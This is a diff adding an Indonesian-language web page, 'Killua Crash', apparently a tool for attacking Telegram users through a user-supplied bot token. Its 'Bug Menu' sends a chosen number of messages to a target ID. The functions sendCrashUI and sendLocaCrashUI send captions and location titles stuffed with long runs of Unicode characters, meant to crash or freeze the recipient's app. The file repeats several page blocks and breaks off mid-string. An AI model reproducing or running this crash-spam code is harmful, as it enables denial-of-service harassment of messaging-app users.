@@ -1,0 +1,1999 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Killua Crash Via Apk</title>
+<style>
+  /* ===== Body dan background ===== */
+  body {
+    margin: 0; padding: 0;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg, #000428 0%, #004e92 100%);
+    color: white;
+    /* Jangan overflow hidden supaya sidebar bisa muncul */
+    overflow-x: hidden;
+    overflow-y: auto;
+  }
+
+  /* ===== Efek smoke animasi ===== */
+  .smoke {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    pointer-events: none;
+    background: radial-gradient(circle at 30% 40%, rgba(255, 0, 0, 0.15), transparent 50%),
+                radial-gradient(circle at 70% 60%, rgba(255, 50, 50, 0.12), transparent 50%),
+                radial-gradient(circle at 50% 30%, rgba(200, 0, 0, 0.1), transparent 50%);
+    animation: smokeMove 10s infinite alternate ease-in-out;
+    z-index: 0;
+  }
+  @keyframes smokeMove {
+    0% {background-position: 30% 40%, 70% 60%, 50% 30%;}
+    100% {background-position: 32% 42%, 68% 58%, 52% 32%;}
+  }
+
+  /* ===== Sidebar ===== */
+  .sidebar {
+    height: 100vh;
+    width: 0;
+    position: fixed;
+    z-index: 9999;
+    top: 0;
+    right: 0;
+    background-color: rgba(0,0,0,0.9);
+    overflow-x: hidden;
+    transition: 0.3s;
+    padding-top: 60px;
+    box-shadow: -2px 0 10px rgba(255,0,0,0.7);
+    display: flex;
+    flex-direction: column;
+    color: white;
+  }
+  .sidebar a {
+    padding: 12px 20px;
+    text-decoration: none;
+    font-size: 18px;
+    color: #ff4444;
+    display: block;
+    transition: 0.3s;
+  }
+  .sidebar a:hover {
+    background-color: #330000;
+    color: #ff9999;
+  }
+  .closebtn {
+    position: absolute;
+    top: 12px;
+    left: 15px;
+    font-size: 36px;
+    cursor: pointer;
+    color: #ff4444;
+    user-select: none;
+  }
+  .sidebar-user {
+    padding: 10px 20px;
+    font-weight: bold;
+    border-bottom: 1px solid #ff4444;
+    margin-bottom: 15px;
+  }
+  #lastLoginSidebar {
+    padding: 5px 20px 15px 20px;
+    font-size: 14px;
+    color: gold;
+  }
+
+  /* ===== Menu button hamburger ===== */
+  .menu-btn {
+    position: fixed;
+    top: 15px;
+    right: 15px;
+    font-size: 30px;
+    cursor: pointer;
+    color: #ff4444;
+    z-index: 10000;
+    user-select: none;
+    background: rgba(0,0,0,0.6);
+    border-radius: 6px;
+    padding: 5px 10px;
+    transition: background-color 0.3s;
+  }
+  .menu-btn:hover {
+    background-color: rgba(255,0,0,0.8);
+  }
+
+  /* ===== User info top right ===== */
+  .user-info {
+    position: fixed;
+    top: 15px;
+    right: 65px;
+    color: #ff4444;
+    font-weight: bold;
+    font-size: 16px;
+    z-index: 10000;
+    user-select: none;
+    display: none;
+  }
+
+  /* ===== Halaman utama .page ===== */
+  .page {
+    display: none;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    position: relative;
+    z-index: 10;
+    padding: 10px;
+    box-sizing: border-box;
+  }
+
+  /* ===== Container utama ===== */
+  .container {
+    background: rgba(0, 0, 0, 0.7);
+    padding: 25px 30px;
+    border-radius: 15px;
+    max-width: 420px;
+    width: 100%;
+    box-shadow: 0 0 15px rgba(255, 0, 0, 0.6);
+    animation: slideUp 0.8s ease;
+    box-sizing: border-box;
+  }
+
+  @keyframes slideUp {
+    from {transform: translateY(50px); opacity: 0;}
+    to {transform: translateY(0); opacity: 1;}
+  }
+
+  /* ===== Logo ===== */
+  .logo {
+    width: 80px; height: 80px; border-radius: 50%;
+    margin: 0 auto 15px auto;
+    display: block;
+    border: 2px solid #ff0000;
+    box-shadow: 0 0 10px #ff0000;
+  }
+
+  /* ===== Nama bot ===== */
+  .bot-name {
+    text-align: center;
+    font-weight: bold;
+    font-size: 24px;
+    margin-bottom: 25px;
+    text-shadow: 0 0 10px #ff0000;
+  }
+
+  /* ===== Input dan button ===== */
+  input[type="text"],
+  input[type="password"],
+  input[type="number"],
+  select {
+    width: 100%;
+    padding: 12px 10px;
+    margin: 8px 0;
+    border-radius: 8px;
+    border: none;
+    font-size: 16px;
+    box-sizing: border-box;
+  }
+
+  button {
+    width: 100%;
+    padding: 12px;
+    background-color: #ff0000;
+    border: none;
+    border-radius: 8px;
+    color: white;
+    font-weight: bold;
+    font-size: 18px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #cc0000;
+  }
+
+  /* ===== Link di dalam teks ===== */
+  a {
+    color: #ff6666;
+    cursor: pointer;
+    text-decoration: underline;
+  }
+  a:hover {
+    color: #ff2222;
+  }
+
+  /* ===== Console output styling ===== */
+  #consoleOutput {
+    background: rgba(0,0,0,0.8);
+    border-radius: 10px;
+    padding: 10px;
+    height: 150px;
+    overflow-y: auto;
+    white-space: pre-wrap;
+    font-family: monospace;
+    font-size: 14px;
+    box-sizing: border-box;
+    margin-top: 10px;
+  }
+
+  /* Scrollbar styling for console */
+  #consoleOutput::-webkit-scrollbar {
+    width: 8px;
+  }
+  #consoleOutput::-webkit-scrollbar-thumb {
+    background: #ff4444;
+    border-radius: 4px;
+  }
+
+  /* Blink class for last login */
+  .blink {
+    animation: blinkAnim 1.5s infinite;
+  }
+  @keyframes blinkAnim {
+    0%, 100% {opacity: 1;}
+    50% {opacity: 0.5;}
+  }
+
+</style>
+</head>
+<body>
+
+<div class="smoke"></div>
+
+<!-- Sidebar -->
+<div id="mySidebar" class="sidebar">
+  <span class="closebtn" onclick="closeNav()">&times;</span>
+  <div id="sidebarUser" class="sidebar-user">Login: -</div>
+  <div id="lastLoginSidebar" style="display:none;"></div>
+  <a href="#" onclick="showPage('pageDashboard')">🏠 Dashboard</a>
+  <a href="#" onclick="showPage('page1')">🤖 Add Token Bot</a>
+  <a href="#" onclick="showPage('pageSpam')">🐞 Bug Menu</a>
+  <a href="#" onclick="logout()" style="color: #ff6666; font-weight: bold;">🚪 Logout</a>
+</div>
+
+<!-- user info top right -->
+<span id="userInfoTop" class="user-info"></span>
+
+<!-- Menu button (hamburger) -->
+<span id="menuButton" class="menu-btn" onclick="openNav()" style="display:none;">☰</span>
+
+<!-- Page: Login -->
+<div id="pageLogin" class="page" style="display:flex;">
+  <div class="container">
+    <img src="https://files.catbox.moe/nszyib.jpg" alt="Logo" class="logo" />
+    <div class="bot-name">Welcome To Killua Crash</div>
+    <input type="text" id="loginUsername" placeholder="Username" autocomplete="off" />
+    <input type="password" id="loginPassword" placeholder="Password" autocomplete="off" />
+    <button onclick="validateLogin()">Login</button>
+    <p id="loginError" style="color:#ff4444; margin-top:10px;"></p>
+    <button id="developerButton" style="display:none; margin-top:10px;" onclick="openDeveloper()">DEVELOPER</button>
+  </div>
+</div>
+
+<!-- Halaman Dashboard -->
+<div id="pageDashboard" class="page" style="display:none;">
+  <div class="container" style="text-align:center;">
+    <h2>Selamat Datang di Dashboard</h2>
+    <p id="dashboardWelcome"></p>
+    <p>Silakan pilih menu di kanan atas untuk mulai.</p>
+  </div>
+</div>
+
+<!-- Halaman Token -->
+<div id="page1" class="page" style="display:none;">
+  <div class="container">
+    <img src="https://files.catbox.moe/nszyib.jpg" alt="Logo" class="logo" />
+    <div class="bot-name">Welcome To Killua Crash</div>
+    <input type="password" id="botTokenInput" placeholder="Masukkan Token Bot Telegram" />
+    <button onclick="checkToken()">Lanjut</button>
+<button style="margin-top:10px; background-color:#555;" onclick="hapusToken()">Hapus Token</button>
+  </div>
+</div>
+
+<!-- Halaman Loading -->
+<div id="pageLoading" class="page" style="display:none;">
+  <div class="container">
+    <h3>Memeriksa token...</h3>
+  </div>
+</div>
+
+<!-- Halaman Bug Menu (Spam) -->
+<div id="pageSpam" class="page" style="display:none;">
+  <div class="container">
+    <img src="https://files.catbox.moe/nszyib.jpg" alt="Logo" class="logo" />
+    <div class="bot-name">Welcome To Killua Crash</div>
+    <input type="text" id="targetId" placeholder="ID atau username target" />
+    <input type="number" id="msgCount" placeholder="Jumlah pesan" value="1" min="1" />
+    <select id="messageSelect">
+      <option value="" disabled selected>Pilih Menu Fitur</option>
+      <option value="crash_ui">CRASH UI</option>
+      <option value="crash_ios">CRASH IOS</option>
+    </select>
+    <button onclick="sendSpam()">Kirim</button>
+    <h3>Log:</h3>
+    <pre id="consoleOutput"></pre>
+  </div>
+</div>
+
+<!-- Toast Notifikasi -->
+<div id="toast" style="
+  visibility: hidden;
+  min-width: 250px;
+  margin-left: -125px;
+  background-color: #ff4444;
+  color: #fff;
+  text-align: center;
+  border-radius: 8px;
+  padding: 16px;
+  position: fixed;
+  z-index: 99999;
+  left: 50%;
+  bottom: 30px;
+  font-size: 17px;
+  box-shadow: 0 0 10px rgba(255,0,0,0.7);
+">
+  <span id="toastMessage"></span>
+</div>
+
+<script>
+// URL file user list di GitHub
+const GITHUB_USER_LIST_URL = "https://raw.githubusercontent.com/SuikaRyp/Database/main/Suika.txt";
+
+// Ambil daftar user valid dari GitHub
+async function fetchValidUsers() {
+  try {
+    const response = await fetch(GITHUB_USER_LIST_URL + "?_=" + Date.now()); // cache buster
+    const text = await response.text();
+
+    return text
+      .split("\n")
+      .map(line => line.trim())
+      .filter(line => line)
+      .map(line => {
+        const [username, password] = line.split(":");
+        return { username, password };
+      });
+  } catch (error) {
+    alert("❌ Gagal mengambil daftar user dari server");
+    return [];
+  }
+}
+
+// Validasi login user
+async function validateLogin() {
+  const USERNAME = document.getElementById("loginUsername").value.trim();
+  const PASSWORD = document.getElementById("loginPassword").value.trim();
+  const errorEl = document.getElementById("loginError");
+
+  if (!USERNAME || !PASSWORD) {
+    errorEl.textContent = "Username dan password harus diisi!";
+    return;
+  }
+
+  const validUsers = await fetchValidUsers();
+  const isValid = validUsers.some(
+    user => user.username === USERNAME && user.password === PASSWORD
+  );
+
+  if (!isValid) {
+    errorEl.textContent = "Username atau password salah!";
+    return;
+  }
+
+  // Login berhasil
+  localStorage.setItem("loggedInUser", USERNAME);
+  localStorage.setItem("lastLogin", new Date().toString());
+  document.getElementById("loginError").textContent = "";
+
+  alert(`✅ Login berhasil sebagai ${USERNAME}`);
+
+  // Update UI login
+  loggedInUser = USERNAME;
+  document.getElementById("menuButton").style.display = "block";
+  document.getElementById("userInfoTop").textContent = `Halo, ${USERNAME}`;
+  document.getElementById("userInfoTop").style.display = "block";
+  document.getElementById("sidebarUser").textContent = `Login: ${USERNAME}`;
+
+  updateLastLoginUI(new Date().toString());
+  updateDashboardWelcome();
+  showPage("pageDashboard");
+}
+
+function loginSuccess(username, isAdmin) {
+  document.getElementById("loginError").textContent = "";
+  loggedInUser = username;
+  window.isAdmin = isAdmin;  // buat variabel global isAdmin
+  const loginTime = new Date().toString();
+  localStorage.setItem("loggedInUser", loggedInUser);
+  localStorage.setItem("lastLogin", loginTime);
+  localStorage.setItem("isAdmin", isAdmin);
+
+  document.getElementById("menuButton").style.display = "block";
+  document.getElementById("userInfoTop").textContent = `Halo, ${loggedInUser}` + (isAdmin ? " (Admin)" : "");
+  document.getElementById("userInfoTop").style.display = "block";
+  document.getElementById("sidebarUser").textContent = `Login: ${loggedInUser}`;
+
+  updateLastLoginUI(loginTime);
+  updateDashboardWelcome();
+
+  showPage("pageDashboard");
+}
+</script>
+
+<!-- Halaman Dashboard -->
+<div id="pageDashboard" class="page" style="display:none; justify-content:center; align-items:center; height:100vh;">
+  <div class="container" style="text-align:center;">
+    <h2>Selamat Datang di Dashboard</h2>
+    <p id="dashboardWelcome"></p>
+    <p>Silakan pilih menu di kanan atas untuk mulai.</p>
+  </div>
+</div>
+
+<!-- Halaman Token -->
+<div id="page1" class="page" style="display:none; justify-content:center; align-items:center; height:100vh;">
+  <div class="container">
+    <img src="https://files.catbox.moe/nszyib.jpg" alt="Logo" class="logo" />
+    <div class="bot-name">Welcome To Killua Crash</div>
+    <input type="password" id="botTokenInput" placeholder="Masukkan Token Bot Telegram" />
+    <button onclick="checkToken()">Lanjut</button>
+  </div>
+</div>
+
+<!-- Halaman Loading -->
+<div id="pageLoading" class="page" style="display:none; justify-content:center; align-items:center; height:100vh;">
+  <div class="container">
+    <h3>Memeriksa token...</h3>
+  </div>
+</div>
+
+<!-- Halaman Bug Menu (Spam) -->
+<div id="pageSpam" class="page" style="display:none; justify-content:center; align-items:center; height:100vh;">
+  <div class="container">
+    <img src="https://files.catbox.moe/nszyib.jpg" alt="Logo" class="logo" />
+    <div class="bot-name">Welcome To Killua Crash</div>
+    <input type="text" id="targetId" placeholder="ID atau username target" />
+    <input type="number" id="msgCount" placeholder="Jumlah pesan" value="1" min="1" />
+    <select id="messageSelect">
+      <option value="" disabled selected>Pilih Menu Fitur</option>
+      <option value="crash_ui">CRASH UI</option>
+      <option value="crash_ios">CRASH IOS</option>
+    </select>
+    <button onclick="sendSpam()">Kirim</button>
+    <h3>Log:</h3>
+    <pre id="consoleOutput"></pre>
+  </div>
+</div>
+
+<script>
+let botToken = localStorage.getItem("botToken") || "";
+let loggedInUser = "";
+let isAdmin = false;
+
+/* Update tampilan input token sesuai status token tersimpan */
+function updateTokenInputUI() {
+  const tokenInput = document.getElementById("botTokenInput");
+  if (botToken) {
+    tokenInput.value = botToken;
+    tokenInput.disabled = true;
+  } else {
+    tokenInput.value = "";
+    tokenInput.disabled = false;
+  }
+}
+
+/* Fungsi cek token bot Telegram */
+function checkToken() {
+  // Jika sudah ada token tersimpan
+  if (botToken) {
+    alert("Token bot Telegram sudah tersimpan. Tidak perlu menambahkan ulang.");
+    showPage("pageDashboard");
+    return;
+  }
+
+  const inputToken = document.getElementById("botTokenInput").value.trim();
+  if (!inputToken) {
+    alert("Masukkan token bot!");
+    return;
+  }
+  showPage("pageLoading");
+
+  fetch(`https://api.telegram.org/bot${inputToken}/getMe`)
+    .then(res => res.json())
+    .then(data => {
+      if (data.ok) {
+        botToken = inputToken;
+        localStorage.setItem("botToken", botToken);
+        alert("Token valid dan sudah disimpan.");
+        updateTokenInputUI();
+        showPage("pageDashboard");
+      } else {
+        alert("Token tidak valid!");
+        showPage("page1");
+      }
+    })
+    .catch(() => {
+      alert("Gagal memeriksa token!");
+      showPage("page1");
+    });
+}
+
+function showToast(message) {
+  const toast = document.getElementById("toast");
+  const toastMessage = document.getElementById("toastMessage");
+  toastMessage.textContent = message;
+  toast.style.visibility = "visible";
+  toast.style.opacity = "1";
+  setTimeout(() => {
+    toast.style.visibility = "hidden";
+    toast.style.opacity = "0";
+  }, 3000);
+}
+
+function hapusToken() {
+  if (!botToken) {
+    showToast("❌ Tidak ada token bot yang tersimpan");
+    return;
+  }
+  if (confirm("Yakin ingin menghapus token?")) {
+    localStorage.removeItem("botToken");
+    botToken = "";
+    updateTokenInputUI();
+    showToast("✅ Token berhasil dihapus");
+  }
+}
+
+/* Fungsi untuk membuat pesan crash UI */
+async function sendCrashUI(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur. Silakan tambah token terlebih dahulu.");
+    return;
+  }
+
+  try {
+    // Ambil gambar dari URL (mirip di BlankCrashCatalog)
+    const imageUrl = 'https://files.catbox.moe/nszyib.jpg';
+    const caption = "Killua Ni Nih Dekk\n\n" +
+                    "ꦽ".repeat(500) +  // isi spam unicode
+                    "ꦾ".repeat(500);
+
+    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        photo: imageUrl,
+        caption: caption
+      })
+    });
+
+    const data = await res.json();
+    if (data.ok) {
+      document.getElementById("consoleOutput").textContent += `crash UI terkirim ke ${target}\n`;
+    } else {
+      document.getElementById("consoleOutput").textContent += `❌ Gagal: ${data.description}\n`;
+    }
+  } catch (err) {
+    document.getElementById("consoleOutput").textContent += `⚠ Error: ${err.message}\n`;
+  }
+}
+
+/* Fungsi lokasi crash UI untuk Telegram */
+async function sendLocaCrashUI(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur. Silakan tambah token terlebih dahulu.");
+    return;
+  }
+  
+  try {
+    const lat = 0.0;
+    const lon = 0.0;
+    const title = "DO YOU KNOW ME?¿ KILLUA CRASH" + "ᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼ